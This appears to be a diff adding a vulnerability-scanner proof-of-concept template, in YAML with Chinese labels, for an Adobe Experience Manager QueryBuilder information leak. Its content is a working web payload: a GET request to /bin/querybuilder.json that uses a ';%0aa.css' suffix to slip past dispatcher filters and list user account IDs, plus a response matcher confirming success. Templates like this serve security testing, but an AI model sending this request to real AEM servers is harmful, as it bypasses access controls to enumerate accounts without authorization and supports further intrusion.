@@ -1,0 +1,16 @@
+id: poc-yaml-aem-querybuilder-info-leak
+info:
+  name: Adobe Experience Manager (AEM) QueryBuilder信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: AEM
+  osprey-id: vb_2022_0038
+requests:
+- method: GET
+  path: /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User
+  expression: 'contains(body, "{\"success\":true,\"results\"") && contains(body, "jcr")
+
+    '
+variables: {}
+transport: http
